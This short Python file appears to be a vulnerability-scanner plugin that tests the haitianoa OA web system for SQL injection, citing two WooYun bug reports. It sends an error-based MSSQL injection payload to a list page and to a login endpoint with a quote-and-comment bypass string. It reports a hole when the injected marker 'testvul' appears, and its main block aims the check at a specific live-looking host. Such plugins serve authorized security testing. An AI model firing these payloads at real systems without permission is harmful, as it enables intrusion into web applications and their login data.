#!/usr/bin/env python
# -*- coding: utf-8 -*-
#http://www.wooyun.org/bugs/wooyun-2010-061977，http://www.wooyun.org/bugs/wooyun-2010-061213
def assign(service, arg):
    if service == "haitianoa":
        return True, arg

def audit(arg):
    payload1 = "InforForWeb/list.asp?id="
    payload2 = "loginverify.asp?Digest=&urlFrom=&password=admin&Memo=1&username=1'/**/AND/**/1="
    for payload in payload1,payload2:
        code,head,res,errorcode,_url = curl.curl2(arg+payload+'CONVERT(int,%27test%27%2b%27vul%27)--')
        if code == 200 and 'testvul' in res :
            security_hole(arg+payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('haitianoa', 'http://cqkyoa.oicp.net/')[1])